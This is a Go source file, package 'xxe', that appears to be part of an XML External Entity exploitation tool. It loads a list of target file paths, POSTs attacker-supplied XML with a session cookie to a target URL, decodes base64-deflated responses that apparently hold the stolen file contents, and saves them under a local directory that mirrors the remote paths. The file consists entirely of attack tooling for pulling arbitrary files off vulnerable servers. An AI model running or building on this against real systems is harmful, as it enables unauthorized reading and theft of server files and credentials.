package xxe

import (
	"bufio"
	"bytes"
	"compress/flate"
	"encoding/base64"
	"encoding/xml"
	"io/ioutil"
	"net/http"
	"os"

	fp "path/filepath"

	str "strings"
)

type ParamsT struct {
	Url        string
	XmlData    string
	XmlDecoder *xml.Decoder
	Cookie     string
	OutDir     string
	FileList   string
	Files      []string
	LogFd      *os.File
}

type NodeT struct {
	XMLName xml.Name
	Attrs   []xml.Attr `xml:"-"`
	Content []byte     `xml:",innerxml"`
	Nodes   []NodeT    `xml:",any"`
}

type LeafT struct {
	Name  string
	Value string
}

func GetParams(url, xmlData, cookie, outDir, outFile, fileList string, fileListVars []string, truncLog bool) (ParamsT, error) {
	var p ParamsT
	var err error

	p.Url = url

	p.XmlData = xmlData
	p.XmlDecoder = xml.NewDecoder(bytes.NewBuffer([]byte(xmlData)))

	p.Cookie = cookie
	p.OutDir = outDir
	p.FileList = fileList

	p.Files, err = readFileList(fileList, fileListVars)
	if err != nil {
		return p, err
	}

	os.MkdirAll(p.OutDir, 0750)
	opts := os.O_CREATE | os.O_WRONLY
	if truncLog {
		opts = opts | os.O_TRUNC
	} else {
		opts = opts | os.O_APPEND
	}

	p.LogFd, err = os.OpenFile(outFile, opts, 0644)
	if err != nil {
		return p, err
	}

	return p, nil
}

func walkNodes(nodes []NodeT, f func(NodeT) bool) {
	for _, n := range nodes {
		if f(n) {
			walkNodes(n.Nodes, f)
		}
	}
}

func defilter(content string) ([]byte, error) {
	deflated := make([]byte, base64.StdEncoding.DecodedLen(len(content)))
	base64.StdEncoding.Decode(deflated, []byte(content))

	inflated, err := ioutil.ReadAll(
		flate.NewReader(bytes.NewReader(deflated)))

	if err != nil {
		return deflated, err
	}

	return inflated, nil
}

func readFileList(path string, fileListVars []string) ([]string, error) {
	var fileList []string

	fd, err := os.Open(path)
	defer fd.Close()
	if err != nil {
		return fileList, err
	}

	input := bufio.NewScanner(fd)
	for input.Scan() {
		line := str.Trim(input.Text(), " ")
		if str.Contains(line, "${VAR}") {
			for _, v := range fileListVars {
				if v == "" {
					continue
				}
				replaced := str.Replace(line, "${VAR}", v, -1)
				fileList = append(fileList, replaced)
			}
		} else {
			fileList = append(fileList, line)
		}
	}

	return fileList, nil
}

func makeLocalPath(outDir, path string) string {
	path = fp.Clean(path)
	pFields := str.Split(path, "/")

	errPath := pFields[0] == "." || pFields[0] == ".." || pFields[0] == "/"
	if len(pFields) == 1 && errPath {
		return outDir + "/out_file"
	} else if len(pFields) == 1 {
		return fp.Join(outDir, pFields[0])
	}

	var cleanFields []string
	for _, el := range pFields[1:] {
		if el != ".." {
			cleanFields = append(cleanFields, el)
		}
	}

	path = str.Join(cleanFields, "/")
	path = fp.Join(outDir, path)
	os.MkdirAll(fp.Dir(path), 0750)

	return path
}

func makeRequest(url, reqXml, cookie, outDir string) (string, error) {
	client := &http.Client{}

	req, err := http.NewRequest("POST", url, str.NewReader(reqXml))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "text/xml")
	req.Header.Set("cookie", cookie)
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	bodyText, err := ioutil.ReadAll(resp.Body)

	return string(bodyText), nil
}
